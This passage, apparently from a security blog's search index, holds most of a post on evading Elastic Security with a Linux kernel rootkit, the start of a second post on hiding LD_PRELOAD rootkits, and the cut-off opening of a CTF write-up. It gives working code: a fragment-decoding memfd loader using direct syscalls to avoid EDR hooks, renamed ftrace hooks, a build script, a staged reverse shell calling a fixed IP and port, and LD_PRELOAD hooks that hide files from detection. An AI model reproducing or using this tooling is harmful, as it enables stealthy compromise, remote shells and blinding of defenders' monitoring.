Ephemeral memfd (Plaintext - Milliseconds) │ ├─────────────────────────────────────────────────────────────────┤ │ Status: Strings are restored to plaintext │ │ Reason: XOR decode happens during reconstruction │ │ │ │ Timeline: │ │ T+0ms: memfd created │ │ T+5ms: fragments decoded and written │ │ T+10ms: finit_module() called │ │ T+15ms: memfd closed and deleted │ │ │ │ Detection Window: ~15 milliseconds │ │ Elastic Challenge: Must scan anonymous memfd in real-time │ └─────────────────────────────────────────────────────────────────┘ ┌─────────────────────────────────────────────────────────────────┐ │ LAYER 3: Loaded Module (Plaintext but Hidden) │ ├─────────────────────────────────────────────────────────────────┤ │ Status: Strings exist in kernel memory │ │ Reason: Module is loaded normally │ │ │ │ Rootkit Self-Hiding: │ │ ✓ Hidden from lsmod │ │ ✓ Hidden from /sys/module │ │ ✓ Filters /proc/kallsyms │ │ ✓ Filters /proc/modules │ │ ✓ Blocks BPF and tracing │ │ │ │ Result: Invisible to analysis tools │ └─────────────────────────────────────────────────────────────────┘ Why Elastic Doesn\u0026rsquo;t Detect This YARA primarily scans disk files\nFragments are XOR\u0026rsquo;ed and broken up No single file contains the complete signature pattern Original .ko is deleted after fragmentation memfd is ephemeral and anonymous\nExists for ~15 milliseconds during loading No persistent path in filesystem Difficult to scan in real-time Post-load self-hiding\nModule immediately conceals itself Blocks subsequent inspection attempts Filtering prevents memory analysis Resulting Structure fragments/ ├── chunk_000.bin # XOR-encoded fragment (64KB) ├── chunk_001.bin # XOR-encoded fragment (64KB) ├── chunk_002.bin # XOR-encoded fragment (64KB) ├── ... ├── chunk_N.bin # Final fragment (variable size) ├── metadata.json # Contains XOR key and checksums └── reconstruct.sh # Automated reconstruction script Metadata Format { \u0026#34;original_filename\u0026#34;: \u0026#34;singularity.ko\u0026#34;, \u0026#34;original_size\u0026#34;: 245632, \u0026#34;num_fragments\u0026#34;: 4, \u0026#34;chunk_size\u0026#34;: 65536, \u0026#34;encoded\u0026#34;: true, \u0026#34;xor_key\u0026#34;: \u0026#34;a3f5b2c8e1d4f7a6b9c2e5f8a1d4b7c0\u0026#34;, \u0026#34;checksums\u0026#34;: [ \u0026#34;e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855\u0026#34;, \u0026#34;cf83e1357eefb8bdf1542850d66d8007d620e4050b5715dc83f4a921d36ce9ce\u0026#34;, \u0026#34;2c26b46b68ffc68ff99b453c1d30413413422d706483bfa0f98a5e886266e7ae\u0026#34;, \u0026#34;fcde2b2edba56bf408601fb721fe9b5c338d10ee429ea04fae5511b68fbf8fb9\u0026#34; ] } Custom Loader via memfd_create Instead of using insmod or modprobe, we implement a custom loader that:\nReads encrypted fragments from disk Decodes them in memory Creates an anonymous memory file descriptor Writes the reconstructed module to the memory FD Loads the module via direct syscall Immediately closes the memfd (auto-deleted) Loader Architecture /* * Singularity Loader * * 1. Uses 32-bit syscall (finit_module) via inline assembly * 2. Reconstructs .ko from fragments in memory * 3. Decodes XOR encoding (strings restored to plaintext) * 4. Uses memfd_create for ephemeral loading * 5. Direct syscall to avoid libc wrapper * 6. memfd exists only during loading (~15ms) * * Compile: gcc -o loader loader.c -static * Usage: ./loader fragments/ */ #define _GNU_SOURCE #include \u0026lt;stdio.h\u0026gt; #include \u0026lt;stdlib.h\u0026gt; #include \u0026lt;string.h\u0026gt; #include \u0026lt;unistd.h\u0026gt; #include \u0026lt;fcntl.h\u0026gt; #include \u0026lt;sys/syscall.h\u0026gt; #include \u0026lt;sys/stat.h\u0026gt; #include \u0026lt;errno.h\u0026gt; #include \u0026lt;dirent.h\u0026gt; #include \u0026lt;stdint.h\u0026gt; // Syscall numbers #define __NR_finit_module 313 #define __NR_memfd_create 319 // Settings #define MAX_FRAGMENTS 256 #define MAX_CHUNK_SIZE (1024 * 1024) // 1MB #define XOR_KEY_SIZE 16 #define MODULE_FLAGS 0 Direct Syscall Implementation To avoid EDR hooking of libc functions, we use inline assembly for direct syscalls:\n// Direct 64-bit syscall static inline long syscall_direct_64(long number, long arg1, long arg2, long arg3) { long ret; register long r10 asm(\u0026#34;r10\u0026#34;) = arg3; asm volatile( \u0026#34;syscall\u0026#34; : \u0026#34;=a\u0026#34; (ret) : \u0026#34;0\u0026#34; (number), \u0026#34;D\u0026#34; (arg1), \u0026#34;S\u0026#34; (arg2), \u0026#34;d\u0026#34; (r10) : \u0026#34;rcx\u0026#34;, \u0026#34;r11\u0026#34;, \u0026#34;memory\u0026#34; ); return ret; } // Direct 32-bit syscall static inline long syscall_direct_32(long number, long arg1, long arg2, long arg3) { long ret; asm volatile( \u0026#34;int $0x80\u0026#34; : \u0026#34;=a\u0026#34; (ret) : \u0026#34;0\u0026#34; (number), \u0026#34;b\u0026#34; (arg1), \u0026#34;c\u0026#34; (arg2), \u0026#34;d\u0026#34; (arg3) : \u0026#34;memory\u0026#34; ); return ret; } Why This Works:\n32-bit Syscall: The int $0x80 interface is legacy and less monitored than modern syscall instruction Memory File Descriptor Creation static int create_memfd(const char *name) { long fd = syscall_direct_64(__NR_memfd_create, (long)name, 0, 0); if (fd \u0026lt; 0) { fprintf(stderr, \u0026#34;[!] memfd_create failed: %s\\n\u0026#34;, strerror(-fd)); return -1; } printf(\u0026#34;[+] memfd created: fd=%ld (%s)\\n\u0026#34;, fd, name); return (int)fd; } memfd_create creates an anonymous file that:\nExists only in memory (tmpfs) Automatically deleted when all file descriptors are closed Can be passed to finit_module() like a regular file Contains plaintext .ko after XOR decode (but only temporarily) Remember that EDRs can monitor memfd_create() calls, and it can also be detected in /proc/\u0026lt;pid\u0026gt;/fd/ during the brief loading window.\nXOR Decoder static void xor_decode(uint8_t *data, size_t len, const uint8_t *key, size_t key_len) { for (size_t i = 0; i \u0026lt; len; i++) { data[i] ^= key[i % key_len]; } } Critical Note: This decode operation restores all strings to plaintext, including \u0026ldquo;GPL\u0026rdquo; and \u0026ldquo;kallsyms_lookup_name\u0026rdquo;. The evasion relies on the ephemeral nature of this plaintext state, not permanent obfuscation.\nFragment Loading static int load_fragments(const char *dir_path, Fragment *fragments, int *num_fragments) { DIR *dir = opendir(dir_path); if (!dir) { perror(\u0026#34;[!] opendir\u0026#34;); return -1; } struct dirent *entry; int count = 0; printf(\u0026#34;[*] Scanning fragments in: %s\\n\u0026#34;, dir_path); while ((entry = readdir(dir)) != NULL \u0026amp;\u0026amp; count \u0026lt; MAX_FRAGMENTS) { // Look for chunk_XXX.bin if (strncmp(entry-\u0026gt;d_name, \u0026#34;chunk_\u0026#34;, 6) == 0 \u0026amp;\u0026amp; strstr(entry-\u0026gt;d_name, \u0026#34;.bin\u0026#34;) != NULL) { char filepath[512]; snprintf(filepath, sizeof(filepath), \u0026#34;%s/%s\u0026#34;, dir_path, entry-\u0026gt;d_name); // Extract index int idx = atoi(entry-\u0026gt;d_name + 6); // Read fragment FILE *f = fopen(filepath, \u0026#34;rb\u0026#34;); if (!f) { fprintf(stderr, \u0026#34;[!] Error opening %s\\n\u0026#34;, filepath); continue; } fseek(f, 0, SEEK_END); long fsize = ftell(f); fseek(f, 0, SEEK_SET); uint8_t *data = malloc(fsize); if (!data) { fclose(f); continue; } size_t read_bytes = fread(data, 1, fsize, f); fclose(f); if (read_bytes != fsize) { free(data); continue; } fragments[count].data = data; fragments[count].size = fsize; fragments[count].index = idx; count++; printf(\u0026#34;[+] Fragment %d: %s (%ld bytes)\\n\u0026#34;, idx, entry-\u0026gt;d_name, fsize); } } closedir(dir); *num_fragments = count; // Sort fragments by index for (int i = 0; i \u0026lt; count - 1; i++) { for (int j = 0; j \u0026lt; count - i - 1; j++) { if (fragments[j].index \u0026gt; fragments[j + 1].index) { Fragment temp = fragments[j]; fragments[j] = fragments[j + 1]; fragments[j + 1] = temp; } } } return 0; } Module Loading static int load_module_stealthy(int fd, const char *params, int flags) { printf(\u0026#34;[*] Loading module via direct syscall...\\n\u0026#34;); // Try 32-bit syscall first (more stealthy) long ret = syscall_direct_32(__NR_finit_module, fd, (long)params, flags); if (ret \u0026lt; 0) { // Fallback to 64-bit ret = syscall_direct_64(__NR_finit_module, fd, (long)params, flags); } if (ret \u0026lt; 0) { fprintf(stderr, \u0026#34;[!] finit_module failed: %s\\n\u0026#34;, strerror(-ret)); return -1; } printf(\u0026#34;[+] Module loaded successfully!\\n\u0026#34;); return 0; } Complete Loading Workflow int main(int argc, char *argv[]) { // 1. Load fragments Fragment fragments[MAX_FRAGMENTS] = {0}; int num_fragments = 0; load_fragments(fragments_dir, fragments, \u0026amp;num_fragments); // 2. Parse metadata (get XOR key) uint8_t xor_key[XOR_KEY_SIZE] = {0}; int is_encoded = 0; parse_metadata(fragments_dir, xor_key, \u0026amp;is_encoded); // 3. Create memfd (anonymous, temporary) int memfd = create_memfd(\u0026#34;module\u0026#34;); // 4. Reconstruct module in memfd // IMPORTANT: After this step, strings are in PLAINTEXT in memfd for (int i = 0; i \u0026lt; num_fragments; i++) { uint8_t *data = fragments[i].data; size_t size = fragments[i].size; // Decode if necessary (restores plaintext) if (is_encoded) { xor_decode(data, size, xor_key, XOR_KEY_SIZE); } // Write to memfd (plaintext .ko now in memory) write(memfd, data, size); } // Reset FD position lseek(memfd, 0, SEEK_SET); // 5. Load module via direct syscall // Plaintext .ko exists in memfd for ~15ms during this call load_module_stealthy(memfd, module_params, MODULE_FLAGS); // 6. Cleanup (memfd automatically deleted) // After this, the only plaintext copy is in kernel memory // where the rootkit\u0026#39;s self-hiding protects it close(memfd); return 0; } Advantages of This Approach:\nNo .ko file on disk after compilation Fragments can be deleted after loading Plaintext .ko exists only in ephemeral memfd (~15ms window) Post-load self-hiding prevents subsequent analysis Static Analysis Resistance:\nIndividual fragments don\u0026rsquo;t match YARA signatures (XOR\u0026rsquo;ed) No complete ELF structure visible on disk Plaintext reconstruction happens in anonymous, temporary memfd Loaded module immediately hides itself from inspection tools Detection Challenges for EDR:\nMust scan ephemeral memfd in real-time (15ms window) Must bypass rootkit\u0026rsquo;s anti-analysis features post-load Disk-based YARA scanning ineffective against XOR\u0026rsquo;ed fragments Evasion Technique 3: Ftrace Helper Obfuscation The Problem Elastic\u0026rsquo;s rule f07bcabe targets ftrace-based rootkits by detecting function names:\n$str1 = \u0026#34;fh_install_hook\u0026#34; $str2 = \u0026#34;fh_remove_hook\u0026#34; $str3 = \u0026#34;fh_resolve_hook_address\u0026#34; Condition: 2 of them These are standard function names in ftrace hooking frameworks, making them easy signatures.\nThe Solution: Rename Ftrace Framework Functions Our obfuscator treats ftrace helper functions like any other custom function:\nBefore:\n// ftrace/ftrace_helper.c notrace int fh_resolve_hook_address(struct ftrace_hook *hook) { hook-\u0026gt;address = kallsyms_lookup_name(hook-\u0026gt;name); // ... } notrace int fh_install_hook(struct ftrace_hook *hook) { int err = fh_resolve_hook_address(hook); // ... } notrace void fh_remove_hook(struct ftrace_hook *hook) { int err = unregister_ftrace_function(\u0026amp;hook-\u0026gt;ops); // ... } notrace int fh_install_hooks(struct ftrace_hook *hooks, size_t count) { size_t i; int err; for (i = 0; i \u0026lt; count; i++) { err = fh_install_hook(\u0026amp;hooks[i]); // ... } } notrace void fh_remove_hooks(struct ftrace_hook *hooks, size_t count) { size_t i; for (i = 0; i \u0026lt; count; i++) fh_remove_hook(\u0026amp;hooks[i]); } Example after Obfuscation:\n// obfuscated/ftrace/ftrace_helper.c notrace int kern_xploqm_helper(struct ftrace_hook *hook) { hook-\u0026gt;address = kallsyms_lookup_name(hook-\u0026gt;name); // ... } notrace int sys_zmnpqr_ops(struct ftrace_hook *hook) { int err = kern_xploqm_helper(hook); // ... } notrace void net_abqzpx_handler(struct ftrace_hook *hook) { int err = unregister_ftrace_function(\u0026amp;hook-\u0026gt;ops); // ... } notrace int fs_klmnop_worker(struct ftrace_hook *hooks, size_t count) { size_t i; int err; for (i = 0; i \u0026lt; count; i++) { err = sys_zmnpqr_ops(\u0026amp;hooks[i]); // ... } } notrace void proc_qwerty_entry(struct ftrace_hook *hooks, size_t count) { size_t i; for (i = 0; i \u0026lt; count; i++) net_abqzpx_handler(\u0026amp;hooks[i]); } The obfuscated names maintain the ftrace hooking functionality while breaking the specific signature patterns that Elastic Security looks for. The functions remain fully operational since the kernel doesn\u0026rsquo;t care about function names in loaded modules.\nBuild Pipeline: Automated Obfuscation Workflow Our automated build system chains all evasion techniques in a reproducible pipeline:\n#!/bin/bash set -e echo \u0026#34;[*] Singularity Build\u0026#34; rm -rf obfuscated fragments loader singularity_payload* # 1. Obfuscate and compile echo \u0026#34;[1] Obfuscating and compiling...\u0026#34; python3 obfuscator/name_randomizer.py --input . --output obfuscated cd obfuscated \u0026amp;\u0026amp; make \u0026amp;\u0026amp; cd .. # 2. Fragment the .ko echo \u0026#34;[2] Fragmenting module...\u0026#34; python3 obfuscator/ko_fragmenter.py --input obfuscated/singularity.ko --output fragments # 3. CLEANUP - Remove obfuscated directory completely echo \u0026#34;[4] Cleaning build artifacts...\u0026#34; rm -rf obfuscated echo \u0026#34;[+] Build complete! Final files:\u0026#34; echo \u0026#34; - fragments/ (module fragments)\u0026#34; echo \u0026#34; - loader\u0026#34; echo \u0026#34; - NO obfuscated code left behind\u0026#34; Final Test: Successful Evasion In the screenshot we run the build.sh and we can see the saved kernel module fragments and all obfuscated.\nNow, using the loader, we can load Singularity without being detected.\nTesting one of singularity features hiding our process and become root.\nWith these techniques, we successfully bypass Elastic Security\u0026rsquo;s static detection mechanisms.\nBonus: Compilation Path Detection Bypass By default, Elastic Security actively monitors compilation activity in /dev/shm and automatically terminates the process when it detects suspicious operations like compiling loader.c or the Singularity rootkit.\nSimple Evasion Technique:\nThis detection can be easily bypassed by compiling in alternative directories that are less monitored:\n# Instead of /dev/shm (monitored): gcc -o /dev/shm/loader loader.c # Detected and killed # Use alternative paths (less scrutinized): gcc -o /tmp/loader loader.c # Bypasses detection gcc -o /var/tmp/loader loader.c # Bypasses detection Why This Works:\nElastic\u0026rsquo;s behavioral detection rules prioritize monitoring /dev/shm due to its common use in malware. Alternative writable directories like /tmp and /var/tmp receive less aggressive monitoring, allowing the compilation and execution of the loader without triggering automated termination.\nBonus 2: Bypassing Elastic Behavioral Detection for Reverse Shells The latest version of Singularity triggers a reverse shell via ICMP packet hooking. While the previous techniques bypassed static YARA signatures, Elastic\u0026rsquo;s behavioral detection rules caught the reverse shell execution.\nThe Detection Problem Elastic triggered two behavioral alerts:\n\u0026ldquo;Suspicious Execution via setsid and nohup\u0026rdquo; (Risk: 73) \u0026ldquo;Shell Command Execution via Kworker\u0026rdquo; (Risk: 99) Elastic\u0026rsquo;s Behavioral Rules Rule 1: Detects setsid/nohup + /dev/tcp/* patterns\nRule 2: Detects shell processes using /dev/tcp/ or /dev/udp/\nBoth rules automatically kill the process on detection.\nRule 2 Detection Logic:\nprocess where event.action == \u0026#34;exec\u0026#34; and process.name in (\u0026#34;sh\u0026#34;, \u0026#34;bash\u0026#34;, \u0026#34;zsh\u0026#34;, \u0026#34;dash\u0026#34;, \u0026#34;zmodload\u0026#34;) and process.command_line like~ (\u0026#34;*/dev/tcp/*\u0026#34;, \u0026#34;*/dev/udp/*\u0026#34;, \u0026#34;*zsh/net/tcp*\u0026#34;, \u0026#34;*zsh/net/udp*\u0026#34;) The rule scans the entire command line for /dev/tcp/ patterns, making simple obfuscation ineffective.\nOriginal Detected Code // DETECTED by Elastic snprintf(cmd, sizeof(cmd), \u0026#34;bash -c \u0026#39;\u0026#34; \u0026#34;PID=$$; \u0026#34; \u0026#34;kill -59 $PID; \u0026#34; \u0026#34;exec -a \\\u0026#34;%s\\\u0026#34; /bin/bash \u0026amp;\u0026gt;/dev/tcp/%s/%s 0\u0026gt;\u0026amp;1\u0026#34; \u0026#34;\u0026#39; \u0026amp;\u0026#34;, PROC_NAME, YOUR_SRV_IP, SRV_PORT); char *argv[] = {\u0026#34;/usr/bin/setsid\u0026#34;, \u0026#34;/bin/bash\u0026#34;, \u0026#34;-c\u0026#34;, cmd, NULL}; Why detected:\nUses setsid command /dev/tcp/ appears in process arguments Shell spawned from kernel worker context Working Evasion: Staged Script Execution The solution is to separate the malicious payload from process arguments by writing the script to disk first, then executing it.\nKey Changes 1. Write the script to disk:\n#define SCRIPT_PATH \u0026#34;/singularity\u0026#34; // Hide kworker immediately add_hidden_pid(current-\u0026gt;pid); // Create script with automatic process hiding snprintf(script, sizeof(script), \u0026#34;#!/bin/bash\\n\u0026#34; \u0026#34;exec 196\u0026lt;\u0026gt;/dev/tcp/%s/%s\\n\u0026#34; \u0026#34;sh \u0026lt;\u0026amp;196 \u0026gt;\u0026amp;196 2\u0026gt;\u0026amp;196 \u0026amp;\\n\u0026#34; \u0026#34;SHELL_PID=$!\\n\u0026#34; \u0026#34;sleep 1\\n\u0026#34; \u0026#34;kill -59 $SHELL_PID\\n\u0026#34; \u0026#34;kill -59 $$\\n\u0026#34;, YOUR_SRV_IP, SRV_PORT); f = filp_open(SCRIPT_PATH, O_WRONLY | O_CREAT | O_TRUNC, 0755); kernel_write(f, script, strlen(script), \u0026amp;pos); 2. Execute with clean command line:\nchar *argv[] = {\u0026#34;/bin/bash\u0026#34;, SCRIPT_PATH, NULL}; call_usermodehelper_exec(sub_info, UMH_WAIT_PROC); How It Works Step 1: The rootkit immediately hides the kworker thread executing the payload using add_hidden_pid(current-\u0026gt;pid), making the entire process chain invisible from the start.\nStep 2: It writes /singularity containing:\n#!/bin/bash exec 196\u0026lt;\u0026gt;/dev/tcp/192.168.200.164/8081 sh \u0026lt;\u0026amp;196 \u0026gt;\u0026amp;196 2\u0026gt;\u0026amp;196 \u0026amp; SHELL_PID=$! sleep 1 kill -59 $SHELL_PID kill -59 $$ The script:\nOpens TCP connection on file descriptor 196 Spawns reverse shell (sh) in background using that connection Captures the specific PID of the spawned shell: SHELL_PID=$! Waits 1 second for connection to establish Runs kill -59 $SHELL_PID to hide only the reverse shell process Runs kill -59 $$ to hide the parent bash script This approach only hides the specific processes created by the script, avoiding interference with legitimate system sh processes.\nStep 3: Execute the script. Elastic sees only:\n/bin/bash /singularity No /dev/tcp/ in the command line - detection bypassed.\nStep 4: Inside the script, automatic hiding occurs:\nReverse shell spawns in background Script captures the exact PID using $! variable Waits 1 second for connection to establish kill -59 $SHELL_PID hides only the spawned reverse shell kill -59 $$ hides the parent bash script Only the specific processes created by the rootkit are hidden, leaving legitimate system processes untouched.\nResult No behavioral alerts triggered\nReverse shell establishes successfully\nProcesses completely invisible to monitoring tools\nRoot privileges granted automatically\nElastic\u0026rsquo;s behavioral rules scan entire command lines for patterns like /dev/tcp/. By writing the payload to a script file first and executing it with a clean command line, we bypass detection while maintaining full functionality. The rootkit\u0026rsquo;s kill -59 signal automatically handles privilege escalation and process hiding.\nConclusion This research demonstrates techniques to evade Elastic Security\u0026rsquo;s static YARA signatures and behavioral detection rules through:\nStatic Signature Evasion: Symbol randomization, module fragmentation with XOR encoding for disk-based evasion Behavioral Detection Evasion: Staged script execution and process hiding via rootkit hooks These techniques highlight the ongoing cat-and-mouse game between offensive and defensive security. While effective against current detection rules, EDR vendors continuously update their signatures and behavioral analytics.\nKey Takeaways:\nSymbol Randomization breaks function name patterns in YARA rules Module Fragmentation + XOR Encoding defeats disk-based static binary analysis Ephemeral memfd Loading creates a narrow detection window (~15ms) for plaintext module Post-Load Self-Hiding prevents subsequent memory analysis of loaded module Ftrace Helper Obfuscation hides hooking framework signatures Staged Script Execution bypasses command-line behavioral detection Direct Syscalls avoid userland EDR hooks Understanding the Evasion:\nThe success of this approach relies on understanding where and when EDR tools scan:\nDisk scanning is defeated by XOR-encoded fragments Real-time memory scanning is challenged by ephemeral memfd (15ms window) Post-load analysis is blocked by rootkit self-hiding features This layered defense-in-depth approach creates multiple barriers that must all be overcome simultaneously for detection to succeed.\nIf you\u0026rsquo;ve read this far, thank you for your time! Contact me via X (@MatheuzSecurity) or Discord (kprobe) for questions.\n","permalink":"http://localhost:1313/hacking/bypassing-elastic/","summary":"\u003cp\u003e\u003cimg loading=\"lazy\" src=\"https://giffiles.alphacoders.com/223/223415.gif\" alt=\"imgur\"  /\u003e\n\u003c/p\u003e\n\u003cp\u003eStealthy Kernel Rootkit: \u003ca href=\"https://github.com/MatheuZSecurity/Singularity\"\u003ehttps://github.com/MatheuZSecurity/Singularity\u003c/a\u003e\u003c/p\u003e\n\u003cp\u003eRootkit Researchers: \u003ca href=\"https://discord.gg/66N5ZQppU7\"\u003ehttps://discord.gg/66N5ZQppU7\u003c/a\u003e\u003c/p\u003e\n\u003ch1 id=\"introduction\"\u003eIntroduction\u003c/h1\u003e\n\u003cp\u003eSecurity solutions continue to intensify. Modern EDRs like Elastic Security, integrated with Elastic Defend, employ multiple detection layers including YARA signatures and behavioral analysis to identify Linux kernel rootkits, triggering 26+ alerts on a single malicious module.\u003c/p\u003e\n\u003cp\u003eThis article demonstrates how to systematically evade these defenses. We present a comprehensive case study of developing a Linux rootkit that successfully bypasses Elastic Security\u0026rsquo;s detection mechanisms through obfuscation, fragmentation, and staged execution techniques. All content is strictly for educational purposes only.\u003c/p\u003e","title":"Evading Elastic Security: Linux Rootkit Detection Bypass"},{"content":"Hello! Welcome to this post! Well, I have a group that is focused on rootkit research, both for Linux and Windows, feel free to come and participate in our community.\nhttps://discord.gg/66N5ZQppU7 What is LD_PRELOAD Rootkit? Before we begin, we need to understand what an LD_PRELOAD rootkit is.\nIs a type of malware that uses the LD_PRELOAD environment variable to load malicious shared libraries. It intercepts and modifies functions, allowing you to hide files, processes and activities. So, an LD_PRELOAD rootkit runs in user space (ring3), because it does not interact directly with the kernel. Introduction A good point about LD_PRELOAD Rootkit is that, unlike LKM (Loadable Kernel Module), they are much more stable, compatible and are also easier to develop.\nHowever a weak point in them is that for those who have created or know about LD_PRELOAD rootkits, you know that they are easy to detect and remove.\nAnd in this post, in addition to learning some techniques to detect an LD_PRELOAD rootkit, we will learn how to hide it, to prevent these detections mentioned in the post from catching it.\nDetecting LD_PRELOAD rootkit Most of the time LD_PRELOAD rootkits can be detected using ldd /bin/ls, like this:\nldd: Provides a list of the dynamic dependencies that a given program needs. It will return the name of the shared library and its location. They can also be found in /proc/[pid]/maps.\n/proc/[pid]/maps: A file containing the currently mapped memory regions and their access permissions. They can also be easily found in /proc/[pid]/map_files/\n/proc/[pid]/map_files/: Shows memory-mapped files. And of course, what you can\u0026rsquo;t miss is checking /etc/ld.so.preload\n/etc/ld.so.preload: File containing a separate list of shared objects to be loaded before the program. You can also check this using lsof.\nlsof: Lists files opened by processes and used with -p , it shows the shared libraries loaded by a specific process. And these are the main ways to detect a shared object, you saw how easy it is, right? And most of the LD_PRELOAD rootkits that I see, do not have a feature to hide from it, and as I am a very curious person, I decided to learn some ways on how to hide it and it is in the next session that we will learn.\nHiding an LD_PRELOAD Rootkit from ldd and /proc I think that for people who know me, they know that I really like hooking the read, and this case will be no different.\nHere is a simple code in C:\n#define _GNU_SOURCE #include \u0026lt;dlfcn.h\u0026gt; #include \u0026lt;string.h\u0026gt; #include \u0026lt;unistd.h\u0026gt; #include \u0026lt;errno.h\u0026gt; #include \u0026lt;stdlib.h\u0026gt; ssize_t read(int fd, void *buf, size_t count) { static ssize_t (*real_read)(int, void *, size_t) = NULL; if (!real_read) { real_read = dlsym(RTLD_NEXT, \u0026#34;read\u0026#34;); if (!real_read) { errno = ENOSYS; return -1; } } ssize_t result = real_read(fd, buf, count); if (result \u0026gt; 0) { char *start = (char *)buf; char *end = start + result; char *current = start; size_t new_buf_size = result; char *new_buf = (char *)malloc(new_buf_size); if (!new_buf) { errno = ENOMEM; return -1; } size_t new_buf_pos = 0; while (current \u0026lt; end) { char *line_start = current; char *line_end = memchr(current, \u0026#39;\\n\u0026#39;, end - current); if (!line_end) { line_end = end; } else { line_end++; } if (!memmem(line_start, line_end - line_start, \u0026#34;hook.so\u0026#34;, strlen(\u0026#34;hook.so\u0026#34;))) { size_t line_length = line_end - line_start; if (new_buf_pos + line_length \u0026gt; new_buf_size) { new_buf_size = new_buf_pos + line_length; new_buf = (char *)realloc(new_buf, new_buf_size); if (!new_buf) { errno = ENOMEM; return -1; } } memcpy(new_buf + new_buf_pos, line_start, line_length); new_buf_pos += line_length; } current = line_end; } memcpy(buf, new_buf, new_buf_pos); result = new_buf_pos; free(new_buf); } return result; } This code implements a hook in the read function, intercepting file readings and filtering lines that contain the string \u0026quot;hook.so\u0026quot;, using the dlsym function to obtain the original version of read, processing the data read, dynamically allocating memory to store the filtered result and returning this new buffer, while ensuring that any line with \u0026quot;hook.so\u0026quot; is deleted through functions like memm and memchr, effectively \u0026ldquo;hiding\u0026rdquo; the string by copying only the lines that don\u0026rsquo;t contain it to the final buffer.\nTherefore, it is not detected in ldd and by any file/directory in /proc/*.\nExample using ldd:\nExample using /proc/pid/maps:\nExample using /proc/pid/map_files/:\nExample using lsof:\nExample using cat /etc/ld.so.preload:\nThis is a simple solution, nothing too advanced, but it is quite effective.\nHiding from /etc/ld.so.preload As seen previously, the presented technique works, however, if you do cat /etc/ld.so.preload, as expected hook.so will not appear, however, if you use nano, for example, it will be seen there.\nAnd that\u0026rsquo;s bad for us.\nTo do this, we will hook the fopen, read and readdir functions to hide the file /etc/ld.so.preload, making it \u0026ldquo;impossible\u0026rdquo; to open, read or list in directories, and also causing it to be non-existent, for example, if you do a cat /etc/ld.so.preload, it returns No such file or directory.\nHere is a simple code in C:\n#define _GNU_SOURCE #include \u0026lt;stdio.h\u0026gt; #include \u0026lt;stdlib.h\u0026gt; #include \u0026lt;unistd.h\u0026gt; #include \u0026lt;string.h\u0026gt; #include \u0026lt;dlfcn.h\u0026gt; #include \u0026lt;errno.h\u0026gt; #include \u0026lt;sys/stat.h\u0026gt; #include \u0026lt;limits.h\u0026gt; #include \u0026lt;dirent.h\u0026gt; #define HIDDEN_FILE \u0026#34;/etc/ld.so.preload\u0026#34; FILE *(*orig_fopen)(const char *pathname, const char *mode); FILE *fopen(const char *pathname, const char *mode) { if (!orig_fopen) { orig_fopen = dlsym(RTLD_NEXT, \u0026#34;fopen\u0026#34;); } if (strcmp(pathname, HIDDEN_FILE) == 0) { errno = ENOENT; return NULL; } return orig_fopen(pathname, mode); } ssize_t read(int fd, void *buf, size_t count) { static ssize_t (*orig_read)(int, void *, size_t) = NULL; if (!orig_read) { orig_read = dlsym(RTLD_NEXT, \u0026#34;read\u0026#34;); } char path[PATH_MAX]; snprintf(path, sizeof(path), \u0026#34;/proc/self/fd/%d\u0026#34;, fd); char actual_path[PATH_MAX]; ssize_t len = readlink(path, actual_path, sizeof(actual_path) - 1); if (len \u0026gt; 0) { actual_path[len] = \u0026#39;\\0\u0026#39;; if (strcmp(actual_path, HIDDEN_FILE) == 0) { errno = ENOENT; return -1; } } return orig_read(fd, buf, count); } struct dirent *(*orig_readdir)(DIR *dirp); struct dirent *readdir(DIR *dirp) { if (!orig_readdir) { orig_readdir = dlsym(RTLD_NEXT, \u0026#34;readdir\u0026#34;); } struct dirent *entry; while ((entry = orig_readdir(dirp)) != NULL) { if (strcmp(entry-\u0026gt;d_name, \u0026#34;ld.so.preload\u0026#34;) != 0) { return entry; } } return NULL; } fopen: This function checks if the file is /etc/ld.so.preload, if so, prevents it from opening by returning NULL and setting the error to ENOENT (No such file or directory), otherwise, it calls the function fopen original to open other files normally. read: Before reading, the function checks whether the file associated with the fd (file descriptor) is /etc/ld.so.preload (using readlink to obtain the actual path of the file), if so, a error on the read, returning -1 and setting the error to ENOENT, otherwise it calls the original read function to read other files normally. readdir: This function reads directory entries and checks if the name of any entry is ld.so.preload, if it finds that name, it ignores the entry and continues the search, otherwise it returns the entry normally, that is, it becomes invisible if you try to read ls -lah /etc/ |grep ld.so.preload. And then, it becomes more \u0026ldquo;stealth\u0026rdquo;.\nChecking if ld.so.preload is listed in /etc/:\nChecking if you can see the contents of /etc/ld.so.preload:\nAnd of course this isn\u0026rsquo;t 100% perfect, but it\u0026rsquo;s cool to understand how this process works.\nPlot Twist Well\u0026hellip; here\u0026rsquo;s a very funny thing, the process of hiding /etc/ld.so.preload, presented in the post becomes useless when we use strace 😂.\nStrace: Diagnostic, debugging and instructional userspace utility for Linux. This does not work against strace, our code cannot hide from it, because it only handles the read function, while strace can also monitor system calls at the kernel level, where the hook.so is still visible.\nFinal consideration I hope you liked this post, and that you learned something from it, if you have any questions, please contact me on Twitter.\n","permalink":"http://localhost:1313/hacking/ldpreload-rootkit/","summary":"\u003cp\u003eHello! Welcome to this post! Well, I have a group that is focused on rootkit research, both for Linux and Windows, feel free to come and participate in our community.\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ca href=\"https://discord.gg/66N5ZQppU7\"\u003ehttps://discord.gg/66N5ZQppU7\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch2 id=\"what-is-ld_preload-rootkit\"\u003eWhat is LD_PRELOAD Rootkit?\u003c/h2\u003e\n\u003cp\u003eBefore we begin, we need to understand what an \u003ccode\u003eLD_PRELOAD rootkit\u003c/code\u003e is.\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003eIs a type of malware that uses the \u003ccode\u003eLD_PRELOAD\u003c/code\u003e environment variable to load malicious shared libraries. It intercepts and modifies functions, allowing you to hide files, processes and activities. So, an LD_PRELOAD rootkit runs in user space (ring3), because it does not interact directly with the kernel.\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch2 id=\"introduction\"\u003eIntroduction\u003c/h2\u003e\n\u003cp\u003eA good point about LD_PRELOAD Rootkit is that, unlike LKM (Loadable Kernel Module), they are much more stable, compatible and are also easier to develop.\u003c/p\u003e","title":"How detect a LD_PRELOAD rootkit and hide from ldd \u0026 /proc"},{"content":" Challenge Description In this challenge, we\u0026rsquo;re given access to a Linux virtual machine (VM) running Ubuntu. The objective is to exploit a custom kernel module to 